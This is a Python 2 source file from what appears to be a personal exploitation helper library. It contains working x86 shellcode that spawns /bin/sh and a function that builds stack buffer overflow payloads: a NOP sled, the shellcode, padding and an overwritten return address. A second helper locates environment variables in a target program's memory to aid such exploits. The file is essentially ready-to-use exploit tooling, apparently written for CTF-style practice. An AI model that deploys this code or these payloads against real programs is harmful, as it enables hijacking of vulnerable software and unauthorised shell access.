#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from struct import pack
import sys
import os
from mypwn.log import *

__all__ = [
    'return2ShellcodeInStack',
    'getEnvAddr',
  ]

SHELLCODE = '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'
# RETURN_ADDR = 0xbffff770

def return2ShellcodeInStack(offsetToEip, exploitingBufferAddr, nop_sled_size = 0x100, debug = True):
  '''Returns exploit string to a stack-based overflow on x86 architecture.
  Keyword arguments:
    offsetToEip          -- size from exploited buffer to eip
    exploitingBufferAddr -- pretended address of the shellcode in stack
    debug                -- turn on for generate SIGTRAP for debugging
  '''
  # nop sled
  payload = '\x90' * nop_sled_size
  if debug:
    # call int3 - Trace/breakpoint trap
    payload += '\xcc' * 4
  else:
    payload +=  SHELLCODE

  exploit = ''
  if len(payload) < offsetToEip:
    padding = 'A' * (offsetToEip - len(payload))
    eip = pack('I', exploitingBufferAddr)
    exploit = payload + padding + eip + '\n'
  else:
    padding = 'A' * offsetToEip
    eip = pack('I', exploitingBufferAddr + offsetToEip + 4)
    exploit = padding + eip + payload + '\n'

  if "\x00" in exploit:
    log.warn('[%s]: NULL bytes in exploit', return2ShellcodeInStack.__name__)
  return exploit


def getEnvAddr(envName, ELFfile):
  import ctypes
  libc = ctypes.CDLL('libc.so.6')
  getenv = libc.getenv
  getenv.restype = ctypes.c_voidp

  ptr = getenv(envName)
  ptr += (len('/usr/bin/python') - len(ELFfile)) * 2
  return ptr


def return2ShellcodeInEnv(offsetToEip, bufferInEnv, debug = True):
  '''
  '''
  pass


def main():
  if len(sys.argv) < 3:
    print "Usage: %s <environment variable> <target program name>" % sys.argv[0]
    sys.exit(0)
  print "%s will be at 0x%x in %s" % (
      sys.argv[1], getEnvAddr(sys.argv[1], sys.argv[2]), sys.argv[2]
    )


if __name__ == '__main__':
  main()

